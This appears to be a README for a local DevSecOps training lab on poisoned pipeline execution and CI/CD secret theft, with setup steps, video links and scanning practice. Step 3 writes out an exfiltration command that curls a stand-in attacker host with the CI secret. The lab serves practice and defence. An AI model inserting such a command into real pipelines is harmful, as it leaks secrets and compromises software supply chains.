# CI/CD Pipeline Poisoning & Supply Chain Attacks (DevSecOps)

## Overview

Simulate modern software supply chain compromises: Poisoned Pipeline Execution (PPE), stolen CI/CD runner secrets, and commit history leaks.

- **Default Port / Access**: `3002 (Web), 2223 (SSH)`
- **Directory**: `Real_World_Industry_Labs/03_devsecops_ci_cd_poisoning/poisoned_pipeline_gitea`

---

## How to Solve & Practice

1. Start the lab: `docker compose up -d` and open `http://localhost:3002`.
2. Create a repository and commit a workflow file (e.g. `.gitea/workflows/build.yaml`).
3. Poisoned Pipeline Execution (PPE): Submit a Pull Request containing malicious shell commands in the build step: `curl http://attacker.com/steal?token=$CI_SECRET`.
4. Practice scanning repositories for leaked secrets using `trufflehog` and `gitleaks`.

---

## YouTube Walkthroughs & Solving Guides

- [John Hammond - Hacking CI/CD (Basic Pipeline Poisoning)](https://www.youtube.com/watch?v=fcibOy-zoN8)
- [DevSecOps - Indirect Poisoned Pipeline Execution](https://www.youtube.com/watch?v=DVF-Q9XuXW0)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Check status
./lab status

# Stop this lab
docker compose down
```
